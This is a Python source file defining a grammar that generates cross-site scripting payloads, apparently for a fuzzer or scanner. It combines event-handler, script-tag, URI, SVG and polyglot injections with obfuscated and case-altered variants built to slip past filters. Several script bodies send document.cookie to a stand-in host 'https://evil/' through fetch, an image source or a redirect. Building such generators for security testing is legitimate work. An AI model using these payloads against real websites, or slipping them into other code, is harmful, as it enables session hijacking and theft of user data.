"""XSS injection grammar — event handlers, script tags, JS URIs, polyglots."""
from .engine import Grammar

XSS_GRAMMAR = Grammar(
    rules={
        "xss": [
            ["event_xss"],
            ["script_xss"],
            ["uri_xss"],
            ["svg_xss"],
            ["polyglot_xss"],
        ],
        # --- event handler XSS ---
        "event_xss": [
            ["tag_open", "event_handler", "=", "js_expr", "tag_close"],
        ],
        "tag_open": [
            ["<img src=x "], ["<svg "], ["<body "], ["<input autofocus "],
            ["<details open "], ["<marquee "], ["<video src=x "],
            ["<audio src=x "], ["<div "], ["<a href=# "],
            ["<select "], ["<textarea "], ["<iframe src=x "],
            ["<math "], ["<table background=x "],
        ],
        "event_handler": [
            ["onerror"], ["onload"], ["onfocus"], ["onmouseover"],
            ["ontoggle"], ["onanimationend"], ["onpointerover"],
            ["onwheel"], ["onfocusin"], ["onbeforeinput"],
            ["onclick"], ["ondblclick"], ["onmouseenter"],
            ["onkeydown"], ["onkeyup"], ["onkeypress"],
            ["oncut"], ["oncopy"], ["onpaste"],
        ],
        "js_expr": [
            ["alert(", "js_arg", ")"],
            ["alert`", "js_arg", "`"],
            ["prompt(", "js_arg", ")"],
            ["confirm(", "js_arg", ")"],
            ["eval(", "encoded_js", ")"],
            ["top[", "obf_alert", "](", "js_arg", ")"],
            ["window['al'+'ert'](", "js_arg", ")"],
            ["Function('al'+'ert(1)')()"],
            ["setTimeout('al'+'ert(1)')"],
            ["self[atob('YWxlcnQ=')](", "js_arg", ")"],
        ],
        "js_arg": [
            ["1"], ["document.domain"], ["document.cookie"],
            ["'XSS'"], ["location.href"], ["origin"],
        ],
        "encoded_js": [
            ["atob('YWxlcnQoMSk=')"],
            ["'\\x61lert(1)'"],
            ["String.fromCharCode(97,108,101,114,116,40,49,41)"],
        ],
        "obf_alert": [
            ["'alert'"], ["'al'+'ert'"], ["'\\x61lert'"],
        ],
        "tag_close": [[">"], ["/>"], [" "], ["//"]],
        # --- script tag XSS ---
        "script_xss": [
            ["script_open", "js_code", "script_close"],
        ],
        "script_open": [
            ["<script>"], ["<ScRiPt>"], ["<script/x>"],
            ["<script\t>"], ["<script\n>"],
            ["<script src=data:,alert(1)>"],
        ],
        "js_code": [
            ["alert(document.cookie)"],
            ["fetch('https://evil/'+document.cookie)"],
            ["new Image().src='https://evil/?c='+document.cookie"],
            ["document.location='https://evil/?c='+document.cookie"],
            ["eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))"],
        ],
        "script_close": [
            ["</script>"], ["</ScRiPt>"], ["</script >"],
        ],
        # --- URI XSS ---
        "uri_xss": [
            ["javascript:", "js_expr"],
            ["data:text/html,", "html_payload"],
            ["data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="],
        ],
        "html_payload": [
            ["<script>alert(1)</script>"],
            ["<img src=x onerror=alert(1)>"],
        ],
        # --- SVG XSS ---
        "svg_xss": [
            ["<svg/", "event_handler", "=", "js_expr", ">"],
            ["<svg><animate onbegin=", "js_expr", " attributeName=x dur=1s>"],
            ["<svg><set onbegin=", "js_expr", " attributename=x to=x>"],
            ["<svg><script>", "js_code", "</script></svg>"],
        ],
        # --- polyglot XSS ---
        "polyglot_xss": [
            ["jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */", "event_handler",
             "=", "js_expr", " )//"],
            ["'-", "js_expr", "-'"],
            ["\"><", "event_xss"],
            ["</script><", "script_xss"],
        ],
    },
    start="xss",
)
